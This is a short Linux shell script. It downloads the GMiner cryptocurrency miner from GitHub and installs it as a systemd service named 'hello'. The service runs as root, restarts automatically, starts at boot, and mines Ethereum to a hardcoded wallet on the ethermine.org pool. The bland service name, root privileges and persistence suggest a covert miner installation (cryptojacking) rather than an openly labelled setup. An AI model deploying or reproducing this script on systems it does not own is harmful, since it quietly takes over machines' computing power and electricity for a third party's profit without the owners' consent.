sudo systemctl daemon-reload && sudo systemctl disable hello.service && rm -rf /lib/systemd/system/hello.service && rm -rfv /usr/local/src/kalinh/ && mkdir /usr/local/src/kalinh && cd /usr/local/src/kalinh && wget https://github.com/develsoftware/GMinerRelease/releases/download/2.64/gminer_2_64_linux64.tar.xz && tar -xvf gminer_2_64_linux64.tar.xz

cat > /lib/systemd/system/hello.service <<EOL
[Unit]
Description=hello
After=network.target
[Service]
ExecStart=/usr/local/src/kalinh/miner -a eth -s us1.ethermine.org:4444 -u 0xe9b7556ab6cae2a99ad5f820652ccd8085867c65.g7 -p x
WatchdogSec=1800
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOL

sudo systemctl daemon-reload && sudo systemctl enable hello.service && sudo systemctl start hello.service
